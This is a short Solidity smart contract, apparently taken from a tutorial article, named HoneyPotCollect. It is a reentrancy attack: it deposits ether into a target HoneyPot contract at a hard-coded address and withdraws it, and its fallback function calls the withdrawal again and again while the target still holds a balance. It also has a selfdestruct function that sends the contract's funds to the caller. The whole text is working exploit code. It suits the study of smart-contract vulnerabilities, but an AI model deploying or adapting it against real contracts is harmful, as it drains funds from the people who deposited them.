// Example from; https://medium.com/@gus_tavo_guim/4470a2d8dfe4
// Updated to solidity version 0.5.8
pragma solidity >=0.5.8;
import "./HoneyPot.sol";
contract HoneyPotCollect {
	HoneyPot public honeypot = HoneyPot(0xcDC7164180454CD875D49B9cAcE941C46ca48F47);  
	function kill () public {
		selfdestruct(msg.sender);
	}
	function collect() public payable {
		honeypot.put.value(msg.value)();
		honeypot.get();
	}
	function () external payable {
		if (address(honeypot).balance >= msg.value) {
			honeypot.get();
		}
	}
}